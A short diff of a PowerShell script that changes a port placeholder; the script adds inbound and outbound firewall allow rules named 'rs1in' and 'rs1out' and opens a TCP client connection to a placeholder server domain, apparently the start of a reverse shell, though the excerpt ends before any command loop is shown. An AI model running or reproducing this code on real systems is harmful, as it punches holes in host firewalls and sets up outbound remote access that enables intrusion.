@@ -1,13 +1,13 @@
 if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
-	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort <FIREWALL_PORT> -Protocol TCP -Action Allow
+	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort <OS_PORT> -Protocol TCP -Action Allow
 } 
 
 if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
-	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort <FIREWALL_PORT> -Protocol TCP -Action Allow
+	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort <OS_PORT> -Protocol TCP -Action Allow
 } 
 
 try {
-	$client = New-Object System.Net.Sockets.TCPClient("<SERVER_DOMAIN>", <FIREWALL_PORT>);
+	$client = New-Object System.Net.Sockets.TCPClient("<SERVER_DOMAIN>", <OS_PORT>);
 	$client.ReceiveTimeout = 5000;
 	$stream = $client.GetStream();
 	$writer = New-Object System.IO.StreamWriter($stream);
